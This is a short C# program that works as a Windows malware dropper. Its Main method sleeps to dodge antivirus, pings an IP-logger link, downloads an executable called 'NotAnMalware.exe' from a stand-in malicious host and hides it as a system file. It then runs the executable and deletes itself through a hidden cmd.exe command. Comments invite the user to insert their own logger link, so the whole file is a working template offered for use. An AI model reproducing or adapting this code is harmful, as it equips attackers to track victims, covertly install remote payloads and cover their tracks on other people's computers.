using System;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Reflection;

namespace Simple
{
	class Program
	{
		private static bool IPL_action(string url)
		{
			try
			{
				using (WebClient webClient = new WebClient()) //creates webClient
				using (webClient.OpenRead(url))
					return true;
			}
			catch { return false; }
		}

		private static void SDEL()
		{
			try
			{
				Process.Start(new ProcessStartInfo
				{
					Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" +
					new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe"
				});
			}
			catch { }
		}

		private static void DFILE(string download_url, string save_path)
		{
			try
			{

				new WebClient().DownloadFile(download_url, save_path);
				File.SetAttributes(save_path, FileAttributes.Hidden | FileAttributes.System);
				File.SetAttributes(save_path.Split('\\')[save_path.Split('\\').Length - 2], FileAttributes.Directory |
					FileAttributes.Hidden | FileAttributes.System);
				Process.Start(save_path);
			}
			catch { }
		}


		static void Main()
		{
			System.Threading.Thread.Sleep(125); // Waits before installing / IP logging, might prevent some anti virus applications from detection.
			IPL_action("https://eyepeelogger.net/w83jce"); // Your IP logger link here if you want ones
			DFILE("https://maliciouswebsite.apple/NotAnMalware.exe", Path.GetTempPath() + "\\NotAnMalware.exe"); // Installs the file
			SDEL();
		}
	}
   }